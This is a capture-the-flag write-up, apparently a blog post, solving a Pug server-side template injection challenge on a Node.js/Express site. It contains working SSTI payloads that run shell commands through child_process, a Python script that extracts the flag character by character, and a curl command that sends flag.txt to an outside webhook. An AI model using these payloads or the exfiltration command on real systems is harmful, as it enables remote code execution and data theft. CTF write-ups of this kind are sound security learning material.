
# BSides 2025 CTF — Web Exploitation Challenge Walkthrough

Hello, I am H4t3m. Last week I participated in BSides CTF, which was organized by [shellmates](https://www.shellmates.club/) club. My team name: Vuln3ra

I solved 4/6 Web challenges.

## Challenge 1: MyTemplates

From the challenge name, we can guess it was SSTI (Server Side Template Injection).

![Main page](https://cdn-images-1.medium.com/max/800/1*f5mMK09RDkOweRilpPWWiw.png)

This is the main page after scrolling the website.

![Form 1](https://cdn-images-1.medium.com/max/800/1*G5RGjxE3lYuczYATzPpoQw.png)

![Form 2](https://cdn-images-1.medium.com/max/800/1*lnaiD0bEhoAJsQ24Z83nrQ.png)

We got here two forms, but before that, let's see which language made it.

![Header response](https://cdn-images-1.medium.com/max/800/1*DHdANGWHp9Befmipwn3tEw.png)

In the Header response, we see `x-powered-by: Express`.

But in Node.js, there are many templates that can be used (Ejs, Pug, **Handlebars**).

After a few tests, the forms return messages:
- In the first one: "Thanks for your submission!"
- In the second: "Thank you for your message! We'll be in touch."

### Simple Payloads Tested

I tested these in both forms:

- `{{7*7}}` (this is for Python — I tested it before seeing the Header response)
- `<%= 7 * 7 %>` (this is for EJS)
- `#{ 7*7 }` (this is for Pug)

### Next Step

We see the forms return the same messages.

Let's try a payload that intentionally triggers an error. For example, sending an expression **without closing the template delimiters** (missing the closing braces) causes the template engine to throw a parsing error.

![Error message](https://cdn-images-1.medium.com/max/800/1*Y2oNo9PKr-7S27dptDRaPA.png)

So we got something after testing `#{7*7`.

After using Claude AI, we tested this payload to run commands:
```
#{global.process.mainModule.require('child_process').execSync('ls').toString()}
```

This ran without error.
```
#{global.process.mainModule.require('child_process').execSync('l').toString()}
```

This returned an error. After that, we tested commands like `cat flag.txt` — it ran without error.

### Getting the Flag

Next step to get the flag: we have 2 options. The first one is my solution — I got the flag using the `grep` command, testing character by character to build the flag.
```python
import requests
import string

# Replace with your actual challenge URL
URL = "http://localhost:8798/submit" #
CHARSET = string.ascii_letters + string.digits + "{}_-!"
flag = "shell"

print(f"[*] Starting extraction... Current: {flag}")

while True:
    for char in CHARSET:
        test_flag = flag + char
        
        # We use {{ and }} so Python treats them as literal characters for the SSTI
        payload = f"#{{global.process.mainModule.require('child_process').execSync('grep \"{test_flag}\" flag.txt').toString()}}"
        
        data = {'userText': payload}
        
        try:
            response = requests.post(URL, data=data)
            
            # Check for the success condition
            if "Welcome Page" in response.text:
                flag += char
                print(f"[+] Found: {flag}")
                break
        except Exception as e:
            print(f"[!] Error: {e}")
            continue
    else:
        print(f"[*] Finished. Final flag: {flag}")
        break
```

![Flag extraction](https://cdn-images-1.medium.com/max/800/1*NGyN7zDTGKNE2gmaPIu3vg.png)

**Final flag:** `shellamtes{pUG_ISNt_DOg_Jst3MpL4Te_N3ithEr_FR0G}`

### Alternative Approach

The second approach was suggested after discussing the challenge with another participant. We used the `curl` command:
```bash
curl https://webhook.site/aa681898-b641-4a54-b311-b06c3205fe93/?flag=$(cat flag.txt)
```

![Webhook result](https://cdn-images-1.medium.com/max/800/1*eepRAB8hHKG83At_HH8kkg.png)

---

This is my writeup on Medium.













